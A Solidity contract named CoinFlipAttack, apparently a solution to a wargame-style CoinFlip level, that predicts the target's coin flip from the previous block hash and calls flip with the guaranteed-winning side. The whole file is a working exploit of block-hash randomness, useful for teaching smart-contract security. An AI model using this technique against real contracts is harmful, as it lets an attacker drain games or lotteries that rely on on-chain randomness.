pragma solidity ^0.6.0;

import "./03_CoinFlip.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract CoinFlipAttack {
  using SafeMath for uint256;

  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip public target;
  uint256 lastBlockNumberRun;

  event CurrentWins(uint256 indexed wins);

  constructor(CoinFlip _target) public {
    target = _target;
  }

  function guess() public {
    require(block.number > lastBlockNumberRun, "Already ran this block!");
    lastBlockNumberRun = block.number;

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    target.flip(side);
    emit CurrentWins(target.consecutiveWins());
  }
}
